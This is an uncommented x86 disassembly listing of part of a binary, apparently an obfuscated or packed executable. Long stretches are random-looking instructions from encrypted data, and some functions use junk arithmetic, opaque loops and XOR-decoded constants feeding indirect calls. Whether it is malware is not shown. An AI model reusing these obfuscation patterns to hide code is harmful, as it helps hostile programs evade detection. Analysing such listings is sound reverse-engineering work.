  4052c7:	xchg   edi,eax
  4052c8:	mov    esp,0x59f9089d
  4052cd:	dec    esi
  4052ce:	or     al,bl
  4052d0:	dec    edi
  4052d1:	and    BYTE PTR [ebp+0x71cc40dd],dl
  4052d7:	lds    ecx,FWORD PTR [ebx]
  4052d9:	jp     0x4052b3
  4052db:	nop
  4052dc:	or     DWORD PTR [esi+ebp*8-0x5ec535f4],ebx
  4052e3:	fs mov ecx,0xae673084
  4052e9:	es in  al,0x62
  4052ec:	pop    ebx
  4052ed:	push   ebx
  4052ee:	or     dl,BYTE PTR [esi]
  4052f0:	push   cs
  4052f1:	push   esp
  4052f2:	xor    DWORD PTR [esi+eiz*8-0x749460de],0xb8e4f5db
  4052fd:	push   0x3c
  4052ff:	and    BYTE PTR [esi+0x5a15b40],al
  405305:	cli    
  405306:	mov    al,dh
  405308:	cmp    BYTE PTR [ebp+ebp*2+0x46],0xdd
  40530d:	fadd   st,st(6)
  40530f:	and    bl,bh
  405311:	pop    edx
  405312:	je     0x4052b4
  405314:	cmp    al,0xa1
  405316:	dec    edx
  405317:	jmp    0x405393
  405319:	std    
  40531a:	ret    
  40531b:	rcl    DWORD PTR [ecx-0x79],1
  40531e:	jb     0x4052f2
  405320:	pop    ss
  405321:	push   0xffffffff
  405323:	loopne 0x40531f
  405325:	hlt    
  405326:	jae    0x4052ec
  405328:	dec    ebp
  405329:	dec    eax
  40532a:	in     al,0x68
  40532c:	std    
  40532d:	sub    al,BYTE PTR [ebp+eax*8-0x59c43322]
  405334:	iret   
  405335:	jno    0x40531f
  405337:	pop    ebp
  405338:	ins    DWORD PTR es:[edi],dx
  405339:	push   ebp
  40533a:	in     al,0x85
  40533c:	call   0x7ed6:0x841a4926
  405343:	pop    es
  405344:	arpl   WORD PTR [ebp+0x59],ax
  405347:	(bad)  
  405348:	mov    cl,0x31
  40534a:	pop    ds
  40534b:	or     edi,DWORD PTR [eax]
  40534d:	push   eax
  40534e:	shl    DWORD PTR [ebx],cl
  405350:	test   al,0x15
  405352:	fstp   DWORD PTR [edi+eax*2]
  405355:	pusha  
  405356:	rol    BYTE PTR [ecx-0x44],cl
  405359:	cwde   
  40535a:	shr    ah,cl
  40535c:	push   eax
  40535d:	cmp    DWORD PTR [ebx+0x7f92ee53],0x5c
  405364:	xchg   ecx,eax
  405365:	and    eax,0xfe945259
  40536a:	mov    al,0x4a
  40536c:	stos   DWORD PTR es:[edi],eax
  40536d:	push   esp
  40536e:	into   
  40536f:	mov    ecx,0xa98aea17
  405374:	out    0xde,eax
  405376:	addr16 in al,dx
  405378:	inc    esp
  405379:	repnz sbb eax,0x62933990
  40537f:	mov    ch,0xbf
  405381:	jnp    0x405401
  405383:	push   eax
  405384:	add    BYTE PTR [esi+ecx*4+0x30f7d901],dh
  40538b:	mov    BYTE PTR [edi],bh
  40538d:	pop    ecx
  40538e:	mov    eax,0x6e8afa62
  405393:	in     eax,dx
  405394:	pop    eax
  405395:	add    DWORD PTR [ebx-0x6b],ebx
  405398:	fidivr WORD PTR [edx+0x6bccb0db]
  40539e:	cwde   
  40539f:	(bad)  
  4053a1:	int3   
  4053a2:	div    DWORD PTR [ebx+eiz*8-0x7cd82880]
  4053a9:	mov    ebp,0x527e1d6c
  4053ae:	test   eax,0xa161945c
  4053b3:	sbb    DWORD PTR [edx-0x49ee67f0],edi
  4053b9:	adc    edx,DWORD PTR [edx+0x1eeda578]
  4053bf:	lock mov ecx,0xdc1a861a
  4053c5:	sti    
  4053c6:	jle    0x4053a9
  4053c8:	mov    DWORD PTR [esi+esi*8-0x30266073],ecx
  4053cf:	ins    BYTE PTR es:[edi],dx
  4053d0:	inc    edx
  4053d1:	push   cs
  4053d2:	test   BYTE PTR [edi+ecx*1+0x6931e67e],ch
  4053d9:	pop    es
  4053da:	sbb    edx,DWORD PTR [edi]
  4053dc:	stos   DWORD PTR es:[edi],eax
  4053dd:	test   al,0x7b
  4053df:	xor    eax,0xeb9406ea
  4053e4:	ins    DWORD PTR es:[edi],dx
  4053e5:	pop    ecx
  4053e6:	shl    BYTE PTR gs:[eax-0x4291a770],cl
  4053ed:	xor    al,0xa1
  4053ef:	and    ebp,DWORD PTR [ebx]
  4053f1:	inc    ebx
  4053f2:	and    eax,DWORD PTR [esi+0x13]
  4053f5:	js     0x405416
  4053f7:	inc    edx
  4053f8:	add    eax,0xab0b7827
  4053fd:	inc    esi
  4053fe:	imul   ebp,DWORD PTR [ebx-0x49],0xffffffb6
  405402:	xor    BYTE PTR [esi],ch
  405404:	div    DWORD PTR [ebx]
  405406:	aam    0x24
  405408:	nop
  405409:	jmp    0x66cb90f
  40540e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40540f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405410:	sbb    BYTE PTR [ecx-0x44],al
  405413:	gs hlt 
  405415:	dec    esp
  405416:	push   esp
  405417:	fidivr WORD PTR [eax-0x6]
  40541a:	shr    BYTE PTR [ebx+0x5b8095ed],cl
  405420:	icebp  
  405421:	fdivr  QWORD PTR [esi+ecx*1]
  405424:	sbb    BYTE PTR [ecx-0x6bef53f],bh
  40542a:	sub    eax,0xb7c2f473
  40542f:	jbe    0x4053f6
  405431:	adc    BYTE PTR [esi],bh
  405433:	(bad)  
  405434:	shr    DWORD PTR [edi],cl
  405436:	pushf  
  405437:	shl    DWORD PTR [ebp+esi*8+0x2e35f989],1
  40543e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40543f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405440:	pop    ds
  405441:	(bad)  
  405442:	hlt    
  405443:	shr    BYTE PTR [edi],1
  405445:	jmp    0x6261a708
  40544a:	je     0x40546e
  40544c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40544d:	sbb    bh,ch
  40544f:	test   al,0x50
  405451:	out    0xd5,al
  405453:	shl    eax,cl
  405455:	push   edx
  405456:	xchg   DWORD PTR [eax+0x211d4815],eax
  40545c:	mov    esi,DWORD PTR [edi-0x68]
  40545f:	mov    dh,0x38
  405461:	mov    edi,edx
  405463:	int3   
  405464:	ja     0x4053ec
  405466:	push   edi
  405467:	cdq    
  405468:	mov    eax,ds:0xa77c2cc2
  40546d:	mov    dh,0xed
  40546f:	inc    eax
  405470:	cmp    al,0xf1
  405472:	not    BYTE PTR [esi]
  405474:	mov    esp,0x898f11a5
  405479:	inc    edx
  40547a:	or     BYTE PTR [ebx+0x558b1c45],cl
  405480:	adc    BYTE PTR [ecx+0x458b0c42],cl
  405486:	and    BYTE PTR [ebx+0x42891055],cl
  40548c:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x4304df
  4054d4:	sbb    DWORD PTR ds:0x430445,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x430471,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x430455,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x4304e3,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x430455,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x430455
  40552a:	inc    eax
  40552b:	mov    ds:0x430455,eax
  405530:	cmp    DWORD PTR ds:0x430455,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x430455,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ec17
  405555:	cmp    DWORD PTR ds:0x430455,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x430455
  405567:	inc    eax
  405568:	mov    ds:0x430455,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x430471,0x14
  40557c:	cmp    DWORD PTR ds:0x430471,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x430471,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42eaa3
  4055a2:	cmp    DWORD PTR ds:0x430471,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x430471
  4055b7:	dec    eax
  4055b8:	mov    ds:0x430471,eax
  4055bd:	mov    eax,ds:0x430471
  4055c2:	dec    eax
  4055c3:	mov    ds:0x430471,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42edd3,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0xbaa2c60a
  4055e5:	pop    ss
  4055e6:	dec    ecx
  4055e7:	push   edx
  4055e8:	sub    bh,BYTE PTR ss:[esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x40566b
  4055f1:	sbb    eax,ebp
  4055f3:	inc    ecx
  4055f4:	mov    ebx,0xe8a52388
  4055f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055fa:	enter  0xa4e3,0xe
  4055fe:	dec    ebp
  4055ff:	sti    
  405600:	imul   edi,DWORD PTR [esi+0x31],0xe2718e2e
  405607:	sahf   
  405608:	xlat   BYTE PTR ds:[ebx]
  405609:	and    DWORD PTR [edx],esi
  40560b:	(bad)  
  40560c:	xor    dl,ch
  40560e:	cmp    al,0x44
  405610:	fldcw  WORD PTR [esi]
  405612:	in     al,dx
  405613:	mov    dl,0x2b
  405615:	xor    eax,0x4a7d5e13
  40561a:	das    
  40561b:	rcl    BYTE PTR [edx],cl
  40561d:	xchg   ebp,eax
  40561e:	push   0x7
  405620:	fwait
  405621:	dec    ebx
  405622:	test   eax,0x11111e7b
  405627:	pop    esi
  405628:	dec    ebx
  405629:	adc    esp,DWORD PTR [ecx+0x3c63c1a]
  40562f:	dec    edi
  405630:	mov    ah,0x2b
  405632:	dec    ebp
  405633:	mov    ah,0x60
  405635:	stc    
  405636:	mov    ebp,0xd62819d4
  40563b:	repz test eax,0xb1aad152
  405641:	lock outs dx,BYTE PTR ds:[esi]
  405643:	fsub   QWORD PTR [eax-0x5ae8386e]
  405649:	or     eax,0x66221821
  40564e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40564f:	cmp    al,0x59
  405651:	add    al,0x2c
  405653:	leave  
  405654:	stc    
  405655:	cs sub al,0xda
  405658:	call   0xda5:0xe654045a
  40565f:	jne    0x40566e
  405661:	pusha  
  405662:	lods   eax,DWORD PTR ds:[esi]
  405664:	repnz test BYTE PTR [ebx+0x461d96cd],dh
  40566b:	in     al,dx
  40566c:	xor    BYTE PTR [eax-0x4d42c71f],dl
  405672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405673:	out    dx,al
  405674:	(bad)  
  405676:	loopne 0x4056f1
  405678:	inc    ebx
  405679:	mov    dh,0x2b
  40567b:	jge    0x405664
  40567d:	pop    es
  40567e:	ds pop esp
  405680:	cmc    
  405681:	adc    al,0x15
  405683:	inc    BYTE PTR [esi+0x65]
  405686:	sbb    dh,BYTE PTR [ecx]
  405688:	arpl   WORD PTR ds:[ebx+0x7c],bx
  40568c:	imul   eax,DWORD PTR [eax],0x17829efc
  405692:	or     esi,esp
  405694:	out    0x48,al
  405696:	mov    ds:0xa24a607a,al
  40569b:	shr    ecx,cl
  40569d:	mov    DWORD PTR [edi],esp
  40569f:	cs out 0x6,al
  4056a2:	cwde   
  4056a3:	push   esi
  4056a4:	lock repz push 0x17
  4056a8:	sbb    DWORD PTR gs:[ecx-0x64],eax
  4056ac:	mov    bl,0x63
  4056ae:	sbb    dh,BYTE PTR [ecx-0x38]
  4056b1:	(bad)  
  4056b2:	(bad)  
  4056b3:	pop    edi
  4056b4:	xchg   ebp,eax
  4056b5:	(bad)  [ecx-0x14]
  4056b8:	test   ebp,esi
  4056ba:	out    dx,al
  4056bb:	ret    0x13f5
  4056be:	mov    BYTE PTR [eax+edi*2],bl
  4056c1:	mov    ebp,0x60cede47
  4056c6:	inc    DWORD PTR gs:[esi-0xa]
  4056ca:	sub    eax,0x867d87ea
  4056cf:	push   edi
  4056d0:	and    ecx,DWORD PTR ss:[edi+0x317d8f20]
  4056d7:	fild   DWORD PTR [ebx+0x5f4c787b]
  4056dd:	out    0x91,eax
  4056df:	aam    0x2d
  4056e1:	in     eax,0xd2
  4056e3:	aad    0xee
  4056e5:	cli    
  4056e6:	mov    ds:0xc794bb8,al
  4056eb:	(bad)  
  4056ec:	jns    0x405692
  4056ee:	or     ebx,DWORD PTR [edi-0x34]
  4056f1:	not    ecx
  4056f3:	sahf   
  4056f4:	push   ss
  4056f5:	push   ebp
  4056f6:	imul   edx,DWORD PTR [ecx+0x1e4d0ba6],0xffffff86
  4056fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056fe:	cmp    dh,bh
  405700:	lahf   
  405701:	jne    0x405686
  405703:	inc    ebx
  405704:	sbb    eax,esi
  405706:	add    edx,DWORD PTR [ecx+edx*1+0x12]
  40570a:	xor    dl,dl
  40570c:	call   0x54e9e271
  405711:	sub    BYTE PTR [edi-0x44],bh
  405714:	push   ss
  405715:	scas   al,BYTE PTR es:[edi]
  405716:	scas   eax,DWORD PTR es:[edi]
  405717:	retf   0x83cf
  40571a:	ss cmc 
  40571c:	loope  0x4056ef
  40571e:	add    al,0x5a
  405720:	lock cld 
  405722:	mov    ah,0x64
  405724:	out    dx,eax
  405725:	xor    ecx,DWORD PTR [esi-0x1bdc07a0]
  40572b:	lods   al,BYTE PTR ds:[esi]
  40572c:	add    eax,0x83dc3d9c
  405731:	xlat   BYTE PTR ss:[ebx]
  405733:	xchg   ebx,eax
  405734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405735:	mov    cl,0xe9
  405737:	adc    ah,dl
  405739:	jg     0x405754
  40573b:	sbb    DWORD PTR [ebp+0x58],edi
  40573e:	dec    edi
  40573f:	xchg   ebp,eax
  405740:	mov    eax,cs
  405742:	add    BYTE PTR [ebx-0x75],dl
  405745:	push   eax
  405746:	sbb    ch,dh
  405748:	clc    
  405749:	xchg   edi,eax
  40574a:	retf   0x9255
  40574d:	out    0xcb,eax
  40574f:	popa   
  405750:	pop    esp
  405751:	sbb    BYTE PTR ds:0x3bdcf5fd,ch
  405757:	mov    eax,ds:0xae978e0d
  40575c:	inc    esi
  40575d:	push   0xffffffec
  40575f:	jne    0x40570a
  405761:	cmp    eax,0x7b58e4ba
  405766:	push   edi
  405767:	xor    al,0x22
  405769:	sti    
  40576a:	sub    BYTE PTR [ecx-0x4f086bab],dh
  405770:	cld    
  405771:	adc    al,0x64
  405773:	js     0x405779
  405775:	mov    ah,0x33
  405777:	xchg   ebp,eax
  405778:	xchg   ebp,eax
  405779:	int    0x83
  40577b:	cwde   
  40577c:	stos   BYTE PTR es:[edi],al
  40577d:	mov    esi,0x20693c23
  405782:	jns    0x40576c
  405784:	mov    ds:0x32d27032,eax
  405789:	clc    
  40578a:	into   
  40578b:	mov    cs,WORD PTR [ebx]
  40578d:	lock pop esp
  40578f:	add    al,0x25
  405791:	jno    0x40579b
  405793:	clc    
  405794:	push   ds
  405795:	ficomp DWORD PTR [edx+0x72]
  405798:	call   0x4f036b62
  40579d:	aam    0x1d
  40579f:	sbb    DWORD PTR [ebx+0x270b86c1],ebp
  4057a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057a6:	ins    DWORD PTR es:[edi],dx
  4057a7:	lds    ebx,FWORD PTR [edx-0x73be1769]
  4057ad:	dec    ebp
  4057ae:	retf   0x4809
  4057b1:	aaa    
  4057b2:	push   0xc3acfe62
  4057b7:	sub    DWORD PTR [ecx-0x23],eax
  4057ba:	or     esi,ebx
  4057bc:	std    
  4057bd:	mov    eax,0x2e3d8a14
  4057c2:	bound  ecx,QWORD PTR [edx]
  4057c4:	(bad)  
  4057c5:	jo     0x40579e
  4057c7:	scas   eax,DWORD PTR es:[edi]
  4057c8:	cmp    esi,edi
  4057ca:	lahf   
  4057cb:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  4057d2:	mov    DWORD PTR ds:0x42eddb,0x1a
  4057dc:	cmp    DWORD PTR ds:0x42eddb,0x0
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42eddb,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e9d7
  4057ff:	mov    eax,ds:0x42eddb
  405804:	dec    eax
  405805:	mov    ds:0x42eddb,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e7c8
  40581d:	or     DWORD PTR ds:0x430445,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x430439,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e7d4,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42edef
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42eddb,0x1c
  405863:	cmp    DWORD PTR ds:0x42eddb,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42eddb,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e9db
  405886:	cmp    DWORD PTR ds:0x42eddb,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42eddb
  405898:	dec    eax
  405899:	mov    ds:0x42eddb,eax
  40589e:	mov    eax,ds:0x42eddb
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42eddb,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x430441,0x42edd3
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x430435,0x42e7c4
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x4304d3,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x43045d
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x43043d
  4058ec:	xor    DWORD PTR ds:0x430461,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x430451,0x42edef
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x430441,0x42e7c8
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x430441
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42edd3,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42edeb
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x430469,0x4304eb
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x430469,0x42e7c8
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x4304d3
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x4304d3,0x42e7d4
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x43043d,0x42eddb
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42edcf,0x42edeb
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x430455
  405986:	sbb    eax,DWORD PTR ds:0x43046d
  40598c:	mov    ds:0x430455,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	inc    ebx
  4059a3:	je     0x40599c
  4059a5:	bound  ecx,QWORD PTR ds:0x557e7e28
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x4059af
  4059af:	jo     0x40596c
  4059b1:	std    
  4059b2:	aaa    
  4059b3:	mov    edx,0x240ffdb5
  4059b8:	add    DWORD PTR [edi],edi
  4059ba:	inc    ebx
  4059bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059bc:	fisub  DWORD PTR [edx-0x7de82469]
  4059c2:	iret   
  4059c3:	leave  
  4059c4:	jg     0x405a01
  4059c6:	jg     0x40594e
  4059c8:	push   edx
  4059c9:	and    BYTE PTR [ecx],bl
  4059cb:	jne    0x4059a4
  4059cd:	loopne 0x4059a8
  4059cf:	ret    0xdb5d
  4059d2:	scas   eax,DWORD PTR es:[edi]
  4059d3:	inc    eax
  4059d4:	xor    dl,BYTE PTR [ecx+0x74debc46]
  4059da:	mov    al,BYTE PTR es:[edx]
  4059dd:	mov    ss,WORD PTR [edx+0x7f]
  4059e0:	aas    
  4059e1:	call   0x3e07:0x6009f6cb
  4059e8:	xor    DWORD PTR [esi+0x1971109a],0x6ebbc84d
  4059f2:	dec    ebx
  4059f3:	mov    edi,0x27e0a496
  4059f8:	stos   DWORD PTR es:[edi],eax
  4059f9:	sub    ch,ch
  4059fb:	add    ch,BYTE PTR ds:0xc3e9c1cf
  405a01:	outs   dx,BYTE PTR ds:[esi]
  405a02:	jo     0x405a29
  405a04:	pop    ebp
  405a05:	dec    ecx
  405a06:	rcl    DWORD PTR [edx],1
  405a08:	cmp    BYTE PTR [esi],al
  405a0a:	sbb    DWORD PTR [ecx-0x14606fc],esi
  405a10:	je     0x4059c1
  405a12:	and    al,0x89
  405a14:	pop    es
  405a15:	push   ds
  405a16:	pop    edx
  405a17:	push   ss
  405a18:	mov    eax,0x9d226265
  405a1d:	das    
  405a1e:	loopne 0x4059c3
  405a20:	(bad)
  405a23:	fimul  WORD PTR [ecx]
  405a25:	xchg   ebp,eax
  405a26:	pop    ecx
  405a27:	xchg   BYTE PTR [edx-0x3e0cadd4],cl
  405a2d:	push   ebp
  405a2e:	mov    BYTE PTR ss:[ebx],ah
  405a31:	or     BYTE PTR [esi+0x20],bh
  405a34:	pop    edx
  405a35:	jle    0x405a24
  405a37:	dec    ecx
  405a38:	or     al,0x75
  405a3a:	mov    al,ds:0xc5ee9f98
  405a3f:	mov    cl,0x5e
  405a41:	popf   
  405a42:	cmp    ebx,ebp
  405a44:	mov    DWORD PTR [edx],edx
  405a46:	stos   BYTE PTR es:[edi],al
  405a47:	jmp    0x405a59
  405a49:	iret   
  405a4a:	inc    esp
  405a4b:	(bad)  
  405a4c:	sahf   
  405a4d:	(bad)  
  405a4f:	fdivr  QWORD PTR [ebp+0x0]
  405a52:	into   
  405a53:	mov    ?,WORD PTR [esp-0xc]
  405a57:	cld    
  405a58:	mov    edx,0x709c80d6
  405a5d:	fsub   st,st(1)
  405a5f:	hlt    
  405a60:	retf   
  405a61:	add    ecx,DWORD PTR [ebx+0xf5d8b08]
  405a67:	lds    eax,FWORD PTR [edi-0x9]
  405a6a:	sti    
  405a6b:	xor    BYTE PTR [ebx],dh
  405a6d:	outs   dx,DWORD PTR ds:[esi]
  405a6e:	xor    al,0x6b
  405a70:	mov    edi,0xf3718ada
  405a75:	stos   DWORD PTR es:[edi],eax
  405a76:	into   
  405a77:	jle    0x405a30
  405a79:	push   0xe9271375
  405a7e:	cs cwde 
  405a80:	fucom  st(6)
  405a82:	xor    ebx,DWORD PTR [eax+eiz*1]
  405a85:	mov    ah,0xba
  405a87:	jge    0x405a14
  405a89:	scas   al,BYTE PTR es:[edi]
  405a8a:	mov    bh,0xb8
  405a8c:	lock sbb al,0xd1
  405a8f:	jb     0x405aea
  405a91:	(bad)  
  405a92:	sbb    bl,BYTE PTR cs:[ebx]
  405a95:	add    esp,ebx
  405a97:	mov    dl,0xf
  405a99:	in     eax,dx
  405a9a:	sub    esp,edi
  405a9c:	xchg   ecx,eax
  405a9d:	cmp    BYTE PTR [ebx+0x20a09f24],ch
  405aa3:	loop   0x405a42
  405aa5:	mov    WORD PTR [edi-0x4d],es
  405aa8:	jle    0x405a60
  405aaa:	add    cl,dh
  405aac:	scas   al,BYTE PTR es:[edi]
  405aad:	jbe    0x405a40
  405aaf:	add    DWORD PTR ds:0x12a41ccb,edi
  405ab5:	test   BYTE PTR [ebp-0x7b04b664],al
  405abb:	push   ecx
  405abc:	fs mov ch,0xb0
  405abf:	aam    0x6d
  405ac1:	loop   0x405a8a
  405ac3:	add    eax,0xadbc2c86
  405ac8:	push   0x10182e71
  405acd:	push   ds
  405ace:	in     eax,0x85
  405ad0:	mov    ebx,0x6eb83602
  405ad5:	cmp    BYTE PTR [edx],0x92
  405ad8:	lea    ebp,[edi+ecx*1-0x7a]
  405adc:	test   DWORD PTR [esi+0x1f],esp
  405adf:	adc    edx,edx
  405ae1:	xchg   ebx,eax
  405ae2:	aam    0xa2
  405ae4:	fisubr WORD PTR [ebp+0x4e4a1ca5]
  405aea:	(bad)  
  405aec:	lds    esp,FWORD PTR [ebx+0x23b73307]
  405af2:	sub    BYTE PTR [eax-0x6f],ch
  405af5:	repz arpl WORD PTR [edx+0x1d],dx
  405af9:	es loop 0x405b5e
  405afc:	outs   dx,DWORD PTR ds:[esi]
  405afd:	jno    0x405af2
  405aff:	mov    DWORD PTR [esp+ebx*2+0x59d8ae3c],eax
  405b06:	test   eax,0x3c5259f0
  405b0b:	mov    edx,0xe86c3ac9
  405b10:	iret   
  405b11:	or     dh,bh
  405b13:	mov    dh,0xb8
  405b15:	jl     0x405ad2
  405b17:	call   0xf8bf3830
  405b1c:	bound  esp,QWORD PTR [edi]
  405b1e:	mov    edx,0x9f1e949a
  405b23:	xchg   esp,eax
  405b24:	inc    edx
  405b25:	out    0x74,al
  405b27:	sti    
  405b28:	pop    ebx
  405b29:	push   edi
  405b2a:	inc    edx
  405b2b:	inc    ecx
  405b2c:	ja     0x405acf
  405b2e:	jne    0x405ba2
  405b30:	inc    eax
  405b31:	jnp    0x405ae6
  405b33:	jne    0x405ae0
  405b35:	retf   0x648f
  405b38:	inc    edi
  405b39:	cs adc eax,edx
  405b3c:	jmp    0x405b44
  405b3e:	or     BYTE PTR [ebx+0x69],ch
  405b41:	test   BYTE PTR [ebx+edx*1+0x61],bl
  405b45:	jno    0x405ae5
  405b47:	das    
  405b48:	sub    al,0xed
  405b4a:	sub    eax,0x6a6fea35
  405b4f:	push   edx
  405b50:	inc    esi
  405b51:	icebp  
  405b52:	adc    al,0xa7
  405b54:	xchg   ebx,eax
  405b55:	call   0x6c0d:0x58172e93
  405b5c:	pop    edx
  405b5d:	and    ah,BYTE PTR [esi+ebx*2-0x70]
  405b61:	adc    al,BYTE PTR [eax+0x1244eb]
  405b67:	mov    edi,0x1cc99e9e
  405b6c:	jg     0x405b4c
  405b6e:	inc    esi
  405b6f:	and    DWORD PTR [esi+0x18],edx
  405b72:	push   0x1cc0e358
  405b77:	arpl   WORD PTR [edx+ebp*4+0x1c],dx
  405b7b:	cmp    eax,0x6aeaa75e
  405b80:	lods   eax,DWORD PTR ds:[esi]
  405b81:	test   bh,al
  405b83:	jnp    0x405bd3
  405b85:	es pushf 
  405b87:	mov    ah,0x44
  405b89:	mov    eax,DWORD PTR [ebp-0x14]
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	test   DWORD PTR [ebx],esi
  405bad:	pop    edi
  405bae:	test   BYTE PTR [eax+0x29],ah
  405bb1:	jle    0x405c31
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405b7f
  405bb8:	loopne 0x405c11
  405bba:	cmp    ebp,DWORD PTR [edi]
  405bbc:	mov    dh,ah
  405bbe:	push   esi
  405bbf:	dec    ecx
  405bc0:	jl     0x405bd6
  405bc2:	mov    ch,0x53
  405bc4:	sub    ch,al
  405bc6:	dec    ebx
